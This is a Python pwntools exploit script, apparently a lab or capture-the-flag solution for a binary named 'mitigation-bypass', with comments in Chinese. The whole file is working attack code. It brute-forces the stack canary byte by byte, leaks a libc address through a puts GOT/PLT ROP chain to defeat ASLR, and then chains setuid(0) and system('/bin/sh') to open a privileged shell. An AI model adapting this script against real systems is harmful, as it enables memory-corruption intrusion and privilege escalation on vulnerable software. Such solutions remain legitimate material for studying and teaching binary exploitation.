from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/mitigation-bypass"
elf = ELF(challenge_path)
p = process(challenge_path)
libc= ELF('./libc.so.6')

# 输入字符串只有104个字节，从105开始爆破8字节的canary
shellcode=p64(0x3131313131313131)*13

class enddd(Exception):
    pass
try:
    for cishu in range(8):
        for char1 in range(256):
            password = shellcode + p8(char1)    
            p.sendafter("Input something to pwn me :)\n",password) 
            info=p.recvline()      
            if info == b"have fun\n":
                shellcode+=p8(char1)
                if(cishu==7):
                    print("we find!",shellcode[104:])
                    raise enddd()
                break
    print("nofound")
except enddd:
    pass

# 程序中寻找一条pop rdi;ret指令的地址
pop_rdi_ret_addr = next(elf.search(asm('pop rdi;ret'), executable=True))
# 布置栈帧，先放入padding+canary+rbp
payload = shellcode + p64(0) 
payload += p64(pop_rdi_ret_addr)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])
p.sendafter("Input something to pwn me :)\n",payload)
# 获取随机化之后的libc基地址
libc_address = u64(p.recvuntil('\n')[:-1].ljust(8, b'\x00')) - libc.sym['puts']
print("we find the libc_addr:",hex(libc_address))
# 继续布置新的栈帧
# search用不了bin_sh = libc.search("/bin/sh").next()
# 报错没有next, 改为下面代码的方式
# 或者直接用命令行查找ROPgadget --binary libc.so.6 --string '/bin/sh'
bin_sh = next(libc.search("/bin/sh"))# bin_sh = 0x00000000001b45bd
bin_sh_addr = libc_address + bin_sh
system_addr = libc_address + libc.sym['system']
setuid_addr = libc_address + libc.sym['setuid']
payload2 = shellcode + p64(0) 
payload2 += p64(pop_rdi_ret_addr)
payload2 += p64(0)
payload2 += p64(setuid_addr)
payload2 += p64(pop_rdi_ret_addr)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)
p.sendafter("Input something to pwn me :)\n",payload2)
# 注意获得shell之后需要进入交互模式，用改了权限的shell读取flag，不然程序终止修改失效
p.interactive()
# python3 /home/hacker/lab2.py

